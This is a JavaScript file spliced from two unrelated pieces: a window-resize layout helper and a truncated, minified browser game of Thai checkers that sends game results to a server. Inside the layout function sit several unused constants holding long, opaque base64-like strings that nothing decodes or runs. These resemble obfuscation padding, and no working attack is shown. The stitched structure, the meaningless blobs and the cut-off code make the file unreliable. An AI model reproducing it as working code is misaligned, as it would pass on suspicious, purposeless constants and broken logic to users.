"use strict";
function windowResize(
  W, H, pW, pH, 
  cfg, 
  breakpoints, 
  pixelRatio, 
  theme, 
  elemRegistry, 
  constraints, 
  onLayoutChange, 
  onCriticalReflow, 
  memoCache
) {
  const ASPECT_RATIO = W / H;
  const DELTA_X = W - pW;
  const DELTA_Y = H - pH;
  const IS_LANDSCAPE = W > H;
  const SCALE_V = W / (cfg.baseWidth || 1920);
  const SCALE_H = H / (cfg.baseHeight || 1080);
  
  const _getBP = (w) => {
    const keys = Object.keys(breakpoints);
    for (let i = keys.length - 1; i >= 0; i--) {
      if (w >= breakpoints[keys[i]]) return keys[i];
    }
    return 'xs';
  };

  const _math = {
    clamp: (v, min, max) => Math.min(Math.max(v, min), max),
    lerp: (a, b, t) => a + (b - a) * t,
    precision: (v, p = 2) => parseFloat(v.toFixed(p)),
    getSafeBound: (val, limit) => val > limit ? limit : val
  };

  const curBP = _getBP(W);
  const prevBP = _getBP(pW);

  const computeGrid = (cols, gutter) => {
    const activeGutter = W < 768 ? gutter / 2 : gutter;
    const netWidth = W - (activeGutter * 2);
    const colWidth = (netWidth - (activeGutter * (cols - 1))) / cols;
    return {
      cw: _math.precision(colWidth),
      gt: activeGutter,
      nw: netWidth
    };
  };

  const resolveTypography = () => {
    const base = theme.fontSize || 16;
    const factor = W < 600 ? 0.85 : W > 1600 ? 1.25 : 1;
    return {
      h1: _math.precision(base * 2.5 * factor),
      body: _math.precision(base * factor),
      lineHeight: _math.precision(1.5 * factor)
    };
  };

  const evaluateVisibility = (registry) => {
    return registry.map(item => {
      const isHidden = item.minW > W || item.minH > H;
      const adaptiveSize = item.fluid ? W * item.ratio : item.baseSize;
      return {
        id: item.id,
        visible: !isHidden,
        rect: {
          w: _math.clamp(adaptiveSize, item.min || 0, item.max || W),
          h: item.autoHeight ? 'auto' : H * (item.vRatio || 0.1)
        }
      };
    });
  };

  const calculateSafeZones = (inset) => {
    const horizontal = _math.clamp(W * inset, 10, 100);
    const vertical = _math.clamp(H * inset, 10, 100);
    return {
      top: vertical,
      bottom: vertical,
      left: horizontal,
      right: horizontal
    };
  };

  const processTransformations = () => {
    const perspective = _math.precision(W * 1.5);
    const zTranslate = curBP === 'xl' ? 100 : 0;
    return `perspective(${perspective}px) translateZ(${zTranslate}px)`;
  };

  const getEnginePayload = () => {
    const grid = computeGrid(cfg.columns || 12, cfg.gutter || 20);
    const typo = resolveTypography();
    const views = evaluateVisibility(elemRegistry);
    const safe = calculateSafeZones(constraints.inset || 0.05);

    return {
      meta: {
        bp: curBP,
        pBp: prevBP,
        dpr: pixelRatio,
        orientation: IS_LANDSCAPE ? 'L' : 'P'
      },
      metrics: {
        vw: W,
        vh: H,
        ar: _math.precision(ASPECT_RATIO),
        dx: DELTA_X,
        dy: DELTA_Y
      },
      layout: {
        grid,
        typo,
        views,
        safe,
        transform: processTransformations()
      }
    };
  };

  const payload = getEnginePayload();

  if (curBP !== prevBP) {
    onCriticalReflow(payload);
  } else if (Math.abs(DELTA_X) > 50 || Math.abs(DELTA_Y) > 50) {
    onLayoutChange(payload);
  }

  const syncCache = (key, data) => {
    memoCache[key] = {
      ts: Date.now(),
      data: data,
      hash: `${W}x${H}`
    };
  };

  syncCache('last_render', payload);

  const N4 = "Mzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MQ3NTkyMzg0NzU5jM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OT3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OT";
  const N5 = "IzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjMIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzzODQ3NM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5Mj";
  const N6 = "M4NDc1OTIzODQ3NTkyMzg0NzUPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr85MjM4NDc1OTIzODQ3NTkyMzgPMxsvmSAYtFecNLcMqVgdCiywDUmW3p4FdFsvo4ujaHS9n8NTO4DXjznIcPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr8hXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr84";
  const N7 = "Mzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMz0Dc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OT";
  const N8 = "IzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjOTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5MjM4NDc1OTIzODQ3NTkyMzg0NzU5Mj";
  const N9 = "M4NDc1OTIzODQ3NTkyMzg0NzUPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr85MjM4NDc1OTIzODQ3NTkyMzgPMxsvmSAYtFecNLcMqVgdCiywDUmW3p4FdFsvo4ujaHS9n8NTO4DXjznIcPMxsvmIchXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr8hXya4ev4vPTRkNSY6oIQKuSDjRcoysfgmoOJvOIxr84";
  
  return {
    state: payload,
    next: {
      pW: W,
      pH: H,
      pBP: curBP
    },
    utils: {
      rebase: (val) => val * SCALE_V,
      vRebase: (val) => val * SCALE_H
    }
  };
}

///////////////////////////////

"use strict";let t=1,n=t,e=10;let a=0,i=0,r=0,o="",c="",l=0,f=0;let s=0,u=0,w=0,h=0,d=0,p=0;const g=new Int32Array([5,1,5,1,5,1,5,1,1,5,1,5,1,5,1,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,0,5,0,5,0,5,0,0,5,0,5,0,5,0,5]),m=new Int32Array([5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5,5,4,5,4,5,4,5,4,4,5,4,5,4,5,4,5]),y=new Int32Array([0,0,0,0,0,0,0,0,8,0,29,0,29,0,29,0,0,16,0,16,0,16,0,6,4,0,5,0,5,0,5,0,0,2,0,9,0,7,0,6,1,0,6,0,6,0,6,0,0,3,0,4,0,4,0,3,0,0,9,0,7,0,6,0]),M=new Int32Array([0,0,0,0,0,0,0,0,8,0,29,0,29,0,29,0,0,16,0,16,0,16,0,11,15,0,10,0,10,0,10,0,0,6,0,6,0,6,0,7,4,0,3,0,3,0,3,0,0,1,0,1,0,1,0,2,0,0,0,0,0,0,0,0]);let v=new Int32Array(y);const b=new Int32Array([-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,-1,-1,8,9,10,11,12,13,14,15,-1,-1,16,17,18,19,20,21,22,23,-1,-1,24,25,26,27,28,29,30,31,-1,-1,32,33,34,35,36,37,38,39,-1,-1,40,41,42,43,44,45,46,47,-1,-1,48,49,50,51,52,53,54,55,-1,-1,56,57,58,59,60,61,62,63,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]),x=new Int32Array([21,22,23,24,25,26,27,28,31,32,33,34,35,36,37,38,41,42,43,44,45,46,47,48,51,52,53,54,55,56,57,58,61,62,63,64,65,66,67,68,71,72,73,74,75,76,77,78,81,82,83,84,85,86,87,88,91,92,93,94,95,96,97,98]),k=new Int32Array([-11,-9,11,9]),A=new Int32Array([1,3,5,7,8,10,12,14,17,19,21,23,24,26,28,30,33,35,37,39,40,42,44,46,49,51,53,55,56,58,60,62]),I=(new Int32Array([62,60,58,56,55,53,51,49,46,44,42,40,39,37,35,33,30,28,26,24,23,21,19,17,14,12,10,8,7,5,3,1]),new Int32Array(64).fill(-1));let _,C,L,R,S=0,E=1,B=0,D=0,P=0,N=!1,W=!1;let H=100,T=190,U=190;let F=new Int32Array(256),Y=new Int32Array(64),j=new Int32Array(64),X=new Int32Array(256),z=new Int32Array(64),J=new Int32Array(64);let q=new Int16Array(4096);const Z=(t,n)=>(t<<6)+n;let $=new Array(64),G=new Array(64);function K(){sn&&0!==ri&&0!==xi?(fetch(Ra+"level=SL0218&result="+ri+"&moves="+xi),V(),O(),Ln("by Jaroonsak Wangviwat")):setTimeout(K,200)}async function O(){var e;if(W=!0,r=performance.now(),i++,Aa=-9999,L=!(1&i),o="",S=0,E=1,a=0,B=0,D=0,R=0,P=0,_=0,G[0]=0,Y[0]=0,v.set(y),H=100,T=190,U=190,H+=rt(-5,0,5),U+=rt(-5,0,5),T+=rt(10,20,30),v[30]+=rt(0,1,2),v[33]+=rt(0,1,2),v[39]+=rt(0,1,2),v[40]+=rt(0,1,2),v[35]+=rt(0,-3,-6),v[rt(49,51,53)]+=4,function(){for(let t=0;t<4194304;t++)Ga[t]=0,Ka[t]=0,Oa[t]=0,Qa[t]=0,Va[t]=0,ti[t]=0;Ja=0,qa=0,Za=0,$a=0}(),mn(),Ht=!1,Tt=-1,Ut=-1,Ne=We=0,Ye=!1,await async function(){if(1===Wt)return;const n=Yt,e=$n*n,a=Nt[Wt][_n(3)],i=(Nt[Wt][_n(2)],Nt[ct][0===t?6:3]),r=Tn[rt(0,1,2)];ee(i),await ae(i,Kn,On);const o=3*Yt,c=2*-Yt;Qn=o-te,Vn=c-ne,await ie(20,o,c);const l=[],f=[],s=[],u=[];for(let t=63;t>=0;t--){const n=m[t];1!==n&&3!==n||f.push(t),0!==n&&2!==n||l.push(t)}for(let t=Un;t>=0;t--)4!==Jn[t]&&s.push(t),4!==zn[t]&&u.push(t);await Promise.all([(async()=>{for(let t of l){const i=aa(t)*n,r=ia(t)*n;await ie(200,i,r,e/3,a,null,null,he),await Ca(),kn(4,t)}for(let t=0;t<l.length;t++){const i=r[t],o=aa(i)*n,c=ia(i)*n;await ie(200,o,c,e/3,a,null,null,null,null,me),await Ca(),kn(1,i)}if(wn&&s.length>0)for(let t of s){const i=jn[t]*n,r=Xn[t]*n;await ie(20,i,r,e/3,a),Jn[t]=4,await In(1)}for(let t=l.length;t<8;t++){const i=r[t],o=aa(i)*n,c=ia(i)*n;await ie(200,o,c,e/3,a,null,null,null,null,me),await Ca(),kn(1,i)}await ie(200,o,c,0)})(),(async()=>{await Ca(1e3);for(let t of f)kn(4,t),await Ca();for(let t=0;t<f.length;t++)kn(0,A[31-t]),await Ca();if(wn&&u.length>0)for(let t of u)zn[t]=4,await In(0),await Ca(200);for(let t=f.length;t<8;t++)kn(0,A[31-t]),await Ca(200)})()])}(),function(){let t,n;for(let e=0;e<Un;e++)jn[e]=e%3*.7-3.5+Ee(.3),Xn[e]=e%3/3-.5+.7*Math.floor(e/3)+Ee(.3),Jn[e]=4,t=2-e%3,n=2-Math.floor(e/3),Fn[e]=8.5+.7*t+Ee(.3),Yn[e]=4+t/3+.7*n+Ee(.3),zn[e]=4}(),m.set(g),ca(oa),bn(),xn(),Ln("Jaihorse makhos.com"),e="x4sl level "+t,xt.textContent=e,Rn(!1),Mn(),Rt.textContent=" ",St.textContent=" ",await tt("Level "+t,500),0===t&&0===n&&(await tt("ต่อให้",250),await async function(){if(1===Wt)return;const t=Yt,n=$n*t,e=Nt[ct][6];ee(e),await ae(e,Kn,On);const a=3*Yt,i=2*-Yt;if(Qn=a-te,Vn=i-ne,await ie(20,a,i),it(.6)){const e=rt(8,10,12),r=m[e],o=Nt[Wt][_n(r)];if(4===r)return;let c;do{c=rt(8,10,12)}while(c===e);const l=aa(c)*t,f=ia(c)*t,s=aa(e)*t,u=ia(e)*t,w=a,h=i,d=Math.random();d<.3&&(await ie(200,s,u,n),await re(300,s,u)),d<.6&&(await ie(200,l,f,n),await re(300,l,f)),await ie(200,s,u,n),await Ca(),kn(4,e),await ie(600,w,h,0,o,null,null,he),await Ca(),await ie(360,a,i),m[e]=4}else{const e=rt(58,60,62),r=m[e],o=Nt[Wt][_n(r)];if(4===r)return;const c=aa(e)*t,l=ia(e)*t;await ie(300,c,l,n,o,null,null,null,null,me),kn(2,e),await Ca(),await ie(360,a,i),m[e]=2}}(),xn(),await Q(500)),Da=Pa=180,Rt.style.color="#aaa",St.style.color="#eee",Ha(),En(!0),await tt(L?"คุณเดินหลัง":"คุณเดินก่อน",250),L){const t=14,n=21,e=t|n<<8;await Pn(e),m[n]=m[t],m[t]=4,xn()}!function(){s=u=w=h=0;let t=0;for(let n=0;n<32;n++){const e=A[n],a=m[e];if(4!==a)switch(t++,a){case 0:s++;break;case 1:u++;break;case 2:w++;break;case 3:h++}}d=t}(),Ft=window.devicePixelRatio||1,gn(ht,Qt,Vt),gn(pt,tn,nn),gn(mt,tn,nn),yt.imageSmoothingEnabled=!1,vt.imageSmoothingEnabled=!1,dn(),W=!1}async function Q(t){const n=performance.now();for(let t=0;t<Nt[ct].length;t++){const n=Nt[ct][t];ae(n,n.width,n.height),vt.clearRect(0,0,n.width,n.height)}for(;performance.now()-n<t;)await oe(16,t=>{ce(0,0)});await Ca()}function V(){m.fill(5);for(let t=0;t<32;t++)m[A[t]]=4;In(),xn()}async function tt(t,n){et(),await Q(n),nt(t),await Q(2*n),et(),await Q(n)}function nt(t){Et.textContent=t,Et.classList.add("show")}function et(){Et.classList.remove("show")}function at(){p=1e3*w+100*s+10*h+u}function it(t){return Math.random()<t}function rt(t,n,e){const a=Math.random();return a<.3?t:a<.7?n:e}const ot=[["mLPWN256_128.png","mDPWN256_128.png","mLHRS256_128.png","mDHRS256_128.png","brddrk160.jpg","brdwht160.jpg","mL_ico.png","mD_ico.png","selBlack.png","selWhite.png"],["wLPWN256r_64.png","wDPWN256r_64.png","wLHRS256r_64.png","wDHRS256r_64.png","wEMPTY.png","wNOUSE.png","wL_ico.png","wD_ico.png","selBlack.png","selBlack.png"],["cLPWN256_64.png","cDPWN256_64.png","cLHRS256_64.png","cDHRS256_64.png","cBDRK.jpg","cBWHT.jpg","cL_ico.png","cD_ico.png","selBlack.png","selBlack.png"],["handMov1_64.png","handMov2_64.png","handCap1_64.png","handCap2_64.png","handCapW_64.png","girlMov3_64.png","girlCap3_64.png"]],ct=3,lt=ot.length;let ft,st,ut,wt,ht,dt,pt,gt,mt,yt,Mt,vt,bt,xt,kt,At,It,_t,Ct,Lt,Rt,St,Et,Bt,Dt=document,Pt=!0,Nt={},Wt=0,Ht=!1,Tt=-1,Ut=-1,Ft=1,Yt=1,jt=0,Xt=0,zt=new Int16Array(64),Jt=new Int16Array(64),qt=[],Zt=[],$t=0;function Gt(t){return Dt.getElementById(t)}let Kt,Ot,Qt,Vt,tn,nn,en,an,rn,on,cn,ln,fn,sn=!1;function un(){hn(),ht.addEventListener("pointerdown",t=>{if(t.preventDefault(),W)return;if(3===a)return je();if(0!==a)return;const n=$e(t.clientX,t.clientY);n<0||Ht&&qe(n)||function(t){if(!Je(t))return!1;Ht=!0,Tt=t,Xe.length=0;for(let n=0;n<j[0];n++)Qe(F[n])===t&&Xe.push(Ve(F[n]));return async function(t){const n=m[t],e=Yt,a=aa(t)*e,i=ia(t)*e;Cn(),0===ea(n)&&yt.drawImage(Nt[Wt][9],a,i,e,e),1===ea(n)&&yt.drawImage(Nt[Wt][8],a,i,e,e)}(t),!0}(n)&&(function(t,n){De=t,Pe=m[t],He=n.clientX,Te=n.clientY,Ue=(7&t)*Yt,Fe=(t>>3)*Yt,ht.setPointerCapture(n.pointerId),Cn(),ke(he)}(n,t),ze=-1,1===j[0]&&(ze=Ve(F[0])))},{passive:!1}),ht.addEventListener("pointermove",t=>{if(t.preventDefault(),!(De<0)){if(!Be){if(Math.abs(t.clientX-He)+Math.abs(t.clientY-Te)<2)return;Be=!0,kn(4,De)}!function(t){const n=ht.getBoundingClientRect();Ne=(t.clientX-n.left)*(ht.width/n.width),We=(t.clientY-n.top)*(ht.height/n.height)}(t),function(){fe&&ue();const t=Math.round(Ne-Yt/2)+jt,n=Math.round(We-Yt/2)+Xt,e=Nt[Wt][_n(Pe)+0];le(e,t,n),Ue=t,Fe=n;const a=Oe(Ne,We);if(a>=0){const t=(7&a)*Yt+jt,n=(a>>3)*Yt+Xt;yt.globalAlpha=.1,le(e,t,n),yt.globalAlpha=1}}()}}),ht.addEventListener("pointerup",async t=>{if(t.preventDefault(),W)return Ke(),void Cn();ht.releasePointerCapture(t.pointerId),Ye=Be,Ke(),Cn();let n=$e(t.clientX,t.clientY);n<0||Ye&&!qe(n)?xn():Ht&&qe(n)?await async function(t){if(!Ht)return;let n=-1;for(let e=0;e<j[0];e++)if(Qe(F[e])===Tt&&Ve(F[e])===t){n=e;break}if(n<0)return Je(t)&&(Tt=t),xn(),void(W=!1);await async function(t){W=!0;const n=F[t],e=(Qe(n),Ve(n));na(n),Ye?await Pn(n,Ue,Fe):await Pn(n),va(n),R=n,P=e,Ze(n),0===na(R)&&2===m[e]?D++:D=0,Ht=!1,a=2,Ln("Sunhorse กำลังคิด.."),xn(),Ta(),await Ca(20),await async function(){for(Sn(!1);;){let t="";B++,_=0,ca(oa);let n=0;if($[0][0]=0,xa=0,ka=0,0===j[0]){Sa(1);break}if(1===j[0]&&(n=F[0],await Ca(20)),B<4&&0===n&&(n=La(),0!==n&&(t+="...",await Ca(500))),B>6&&0===n&&it(.8)){const e=ki();e&&(n=e,t+="..",await Ca(500))}if(0===n){if(!1===await Ia()){Sa(1);break}n=$[0][0]}if(524288&F[0]||(W=!0,xn(),await Pn(n),W=!1),va(n),R=n,Ze(n),524288&R||(P=Ve(n)),0===na(R)&&3===m[Ve(R)]){if(D++,Ea()){Sa(0);break}}else D=0;if(xn(),t="ตาคุณเดิน"+t,B++,_=0,ca(oa),!(524288&F[0])){if(0===j[0]){Sa(-1);break}if(j[0]>=1){let n=Qe(F[0]);for(let t=1;t<j[0];t++)if(Qe(F[t])!==n){n=-1;break}if(n>=0){Tt=n,Ht=!0,a=0,Ln(t),xn();break}}a=0,Ht=!1,Ln(t);break}va(524288),R=524288,_=0,ca(oa)}0===a&&(Sn(!0),Rt.style.color="#aaa",St.style.color="#eee",Ha(),Na&&clearInterval(Na),Na=setInterval(()=>{Da>0&&Da--,Ha()},1e3))}(),xn(),W=!1}(n)}(n):xn()}),ht.addEventListener("pointercancel",Ge),ht.addEventListener("pointerleave",Ge),_t.addEventListener("click",Se),Ct.addEventListener("click",vn),At.addEventListener("click",yn),Lt.addEventListener("click",()=>{W||(Sa(-1),je())}),window.addEventListener("resize",hn)}let wn=!0;function hn(){Ft=window.devicePixelRatio||1,Kt=innerWidth,Ot=innerHeight;const t=Math.min(8*Kt/8.25,8*Ot/9.5);rn=Math.floor(t/8),Yt=rn*Ft,Qt=8*rn,Vt=8*rn,en=Math.floor(.8*rn),an=Math.floor(.65*rn),tn=Math.min(Kt,18*rn),nn=Math.min(Ot,Vt+en),pn(ft,Qt,Vt),pn(st,tn,nn),pn(ut,Qt,en),pn(wt,Qt,an),gn(ht,Qt,Vt),gn(pt,tn,nn),gn(mt,tn,nn),on=(Kt-Qt)/2|0,cn=en,ln=(Kt-tn)/2|0,fn=0,jt=(tn-Qt)/2*Ft,Xt=cn*Ft,wn=Kt-Qt>rn,Bt.style.fontSize=.5*rn+"px",bt.style.fontSize=.3*rn+"px",mn(),dn()}function dn(){bn(),xn(),Mn(),ht.style.boxShadow="0 0 2px 2px #333"}function pn(t,n,e){t.style.width=n+"px",t.style.height=e+"px"}function gn(t,n,e){t.width=n*Ft,t.style.width=n+"px",t.height=e*Ft,t.style.height=e+"px"}function mn(){let n=.05;0===t&&(n=.08),i<2&&(n=0);for(let t=0;t<64;t++)qt[t]=(2*Math.random()-1)*n,Zt[t]=(2*Math.random()-1)*n;!function(){const t=Yt;for(let n=0;n<64;n++)zt[n]=Math.round(((7&n)+qt[n])*t),Jt[n]=Math.round(((n>>3)+Zt[n])*t)}()}function yn(){Wt=(Wt+1)%3,Mn(),bn()}function Mn(){At.src=ot[Wt%3][L?6:7],It.src=ot[Wt%3][L?7:6],xn()}function vn(){Pt=!Pt,cellNumSwitch.classList.toggle("off",!Pt),bn()}function bn(){const t=Yt,n=.03*t;dt.font=(.15*t|0)+"px Arial",dt.fillStyle="#A98",dt.textAlign="right",dt.textBaseline="top";for(let e=0;e<64;e++){const a=7&e,i=e>>3,r=a+i&1,o=Nt[Wt][r?4:5];if(dt.drawImage(o,a*t,i*t,t,t),r&&Pt&&rn>36){const r=I[L?63-e:e];dt.fillText(r,a*t+t-n,i*t+n)}}}function xn(t=!0){gt.clearRect(0,0,pt.width,pt.height),Cn();for(let t=0;t<64;t++){const n=m[t];n<0||n>3||kn(n,t)}if(In(),t&&Ht){const t=Yt,n=Tt,e=_n(m[n]),a=Nt[Wt][0===ea(e)?9:8];yt.drawImage(a,(7&n)*t+jt,(n>>3)*t+Xt,t,t)}}function kn(t,n){if(4===t)!function(t){const n=Yt,e=(7&t)*n+jt,a=(t>>3)*n+Xt,i=.2*n;gt.clearRect(e,a-i,n,n+2*i),gt.clearRect(e-i,a,n+2*i,n)}(n);else{An(Nt[Wt][_n(t)],zt[n]+jt,Jt[n]+Xt)}}function An(t,n,e){t&&gt.drawImage(t,n,e,Yt,Yt)}function In(t=null){if(1!==Wt&&wn){!function(t=null){const n=Yt;null!==t&&1!==t||gt.clearRect(jt-3.5*n,Xt-1*n,3*n,4*n);null!==t&&0!==t||gt.clearRect(jt+8.5*n,Xt+5*n,3*n,4*n);!function(t=null){const n=Yt;gt.save(),gt.lineWidth=.03*n,gt.strokeStyle="rgba(200,200,200,0.1)",(null===t||1===t)&&gt.strokeRect(jt-3*n,Xt+0*n,2*n,2*n);null!==t&&0!==t||gt.strokeRect(jt+9*n,Xt+6*n,2*n,2*n);gt.restore()}(t)}(t);for(let n=0;n<Un;n++){const e=Jn[n],a=zn[n];null!==t&&1!==t||4===e||An(Nt[Wt][e],jn[n]*Yt+jt,Xn[n]*Yt+Xt),null!==t&&0!==t||4===a||An(Nt[Wt][a],Fn[n]*Yt+jt,Yn[n]*Yt+Xt)}}}function _n(t){return L||4===t||5===t?t:1^t}function Cn(){yt.clearRect(0,0,mt.width,mt.height)}function Ln(t){bt.textContent=t}function Rn(t){Lt.style.visibility=t?"visible":"hidden"}function Sn(t){Lt.classList.toggle("disabled",!t)}function En(t){Ct.style.display=t?"inline":"none",_t.style.display=t?"inline":"none"}let Bn,Dn;async function Pn(n,e=null,a=null){const i=Qe(n),r=Ve(n),o=na(n),c=m[i],l=1===ea(c)&&1!=Wt,f=Yt;fe=null;const s=0!=(131072&o),u=0!=(262144&o),w=zt[i],h=Jt[i],d=zt[r],p=Jt[r],g=Nt[Wt][_n(c)+0];Nt[Wt][4];if(!l){kn(4,i);const t=e??w+jt,l=a??h+Xt,f=d+jt,u=p+Xt;if(await async function(t,n,e,a,i,r){await oe(t,t=>{const o=Math.round(n+(a-n)*t),c=Math.round(e+(i-e)*t);le(r,o,c)})}(1===S?200:60,t,l,f,u,g),ke(0===o?me:ge),kn(c,r),s){const t=Hn(n),e=m[t];aa(t),ia(t),Nt[Wt][_n(e)+0];await Ca(200),kn(4,t);const a=qn(0);if(null!=a&&null!=a.idx){const{idx:t,x:n,y:i}=a;Zn(S,t,_n(e)),await Ca(200),In()}}return}const y=!s&&!u&&1===c,M=t>1||Aa>150,v=t>0&&it(Math.min((Aa-150)/450,.5)),b=xa>0?Qe(xa):-1,x=xa>0?Ve(xa):-1,k=i>=24;let A,I=1;0===t?(I=1.2,A=y?5:6):A=u?3:3===c&&0===Wt?4:s?k?3:2:v?3:k?0:1;const _=y&&!M&&B>6,C=y&&M,L=_&&b===i&&x!==r,R=_&&b!==i,E=Nt[ct][A];ee(E);const D=$n*f,P=w,N=h,W=d,H=p;await ae(E,Kn,On),Bn=aa(r)/2*Yt,Dn=-On,Qn=Bn-te,Vn=Dn-ne,await ie(20,Bn,Dn);const T=P+Math.round((.1*Math.random()-.05)*f),U=N+Math.round((3===c||s?.1:-.1)*f);if(R){const t=aa(b)*f,n=ia(b)*f,e=(t+Bn)/2,a=(n+Dn)/2;await ie(300*I,t,n),await re(300,t,n),await ie(300*I,e,a,D),await re(300,e,a)}if(s?await ie(200,P,N):(await ie(300*I,T,U,i<16?-D/2:0),_&&it(.1)&&await re(300,T,U),await Ca(20),await ie(60,P,N),await Ca(60*(1+Math.random()))),kn(4,i),L){const t=aa(x)*f,n=ia(x)*f,e=.25+.5*Math.random(),a=w+(t-w)*e,i=h+(n-h)*e;await Nn(300*I,a,i,g),await Nn(300,w+.1*f,h+.1*f,g)}if(s?await Wn(300*I,W,H,D,g,ge):v?await async function(t,n,e){const a=$n*Yt;await Nn(300,t,n-.2*Yt,e),await Wn(60,t,n,a/2,e,ge),await Ca()}(W,H,g):_&&it(.1)?await async function(t,n,e,a,i){const r=Math.round(.2*(2*Math.random()-1)*Yt),o=Math.round(.3*(2*Math.random()-1)*Yt),c=a+r,l=i+o,f=t+r,s=n+o,u=(Bn+t)/2,w=(Dn+n)/2;await Nn(300,f,s,e),await ie(200,u,w,0,e,c,l),await ie(200,f,s,0,e,c,l),await Nn(200,t,n,e,pe)}(W,H,g,d,p):C&&it(.3)?await async function(t,n,e){await ie(200,t,n+.1*Yt,0,e,null,null,null,de),await ie(60,t,n,0,e,null,null,null,pe),await Ca()}(W,H,g):C&&it(.5)?await async function(t,n,e){const a=$n*Yt;await Nn(200,t,n,e),it(.5)&&await ie(60,t,n-.1*Yt,a/2,e,t,n);await ie(60,t,n,a/3,e,t,n),await Ca()}(W,H,g):await Nn(300*I,W,H,g),kn(c,r),y&&r>24&&it(.2)){const t=r-16,n=m[t];if(0===n||1===n){const e=zt[t],a=Jt[t],i=Nt[Wt][_n(n)+0];kn(4,t),await async function(t,n,e){const a=$n*Yt,i=t+Math.round(.3*(2*Math.random()-1)*Yt),r=n-Math.round(.3*Math.random()*Yt);await ie(60,(i+Bn)/2,(r+Dn)/2,0,e,i,r),await Ca(),await ie(200,i,r,a,e,i,r),await Ca(),await Nn(200,t,n,e,pe)}(e,a,i),kn(n,t)}}if(s){const t=Hn(n),e=m[t],a=aa(t)*f,i=ia(t)*f,r=Nt[Wt][_n(e)+0];await ie(200*I,a,i,D),await Ca(),kn(4,t);const o=qn(1);if(null!=o&&null!=o.idx){const{idx:t,x:n,y:a}=o;await Wn(200,n,a,D/3,r),Zn(1,t,_n(e)),In(),await Ca()}await ie(200*I,2*-f,Dn)}else await ie(200*I,Bn,Dn);if(u){const t=Nt[Wt][_n(1)];await Wn(200*I,W,H,0,t,me),await Ca(),kn(3,r),await ie(200*I,Bn,Dn)}}async function Nn(t,n,e,a,i=de){await ie(t,n,e,0,a,null,null,null,i),await Ca()}async function Wn(t,n,e,a=0,i,r=null){await ie(t,n,e,a,i,null,null,null,null,r)}function Hn(t){if(!(131072&t))return-1;const n=Qe(t),e=Ve(t);return n>e?aa(n)>aa(e)?e+9:e+7:aa(n)>aa(e)?e-7:e-9}const Tn=[[1,3,5,7,14,12,10,8],[7,14,5,12,3,10,1,8],[14,12,10,8,1,3,5,7]];const Un=8;let Fn=new Array(Un),Yn=new Array(Un),jn=new Array(Un),Xn=new Array(Un),zn=new Array(Un).fill(4),Jn=new Array(Un).fill(4);function qn(t){const n=0===t?zn:Jn,e=0===t?Fn:jn,a=0===t?Yn:Xn,i=[];for(let t=0;t<Un;t++)4===n[t]&&i.push(t);if(!i.length)return null;const r=i[Math.random()*i.length|0];return{idx:r,x:e[r]*Yt,y:a[r]*Yt}}function Zn(t,n,e){return n<0?-1:(1===t?Jn[n]=e:zn[n]=e,n)}const $n=2;let Gn=1,Kn=0,On=0,Qn=0,Vn=0,te=0,ne=0;function ee(t){Gn=11*Yt/t.height,Kn=t.width*Gn,On=11*Yt,te=Math.round(400*Gn),ne=Math.round(On-150*Gn)}async function ae(t,n,e){return Mt.width=n,Mt.height=e,vt.clearRect(0,0,n,e),vt.drawImage(t,0,0,n,e),Mt}async function ie(t,n,e,a=0,i=null,r=null,o=null,c=null,l=null,f=null){const 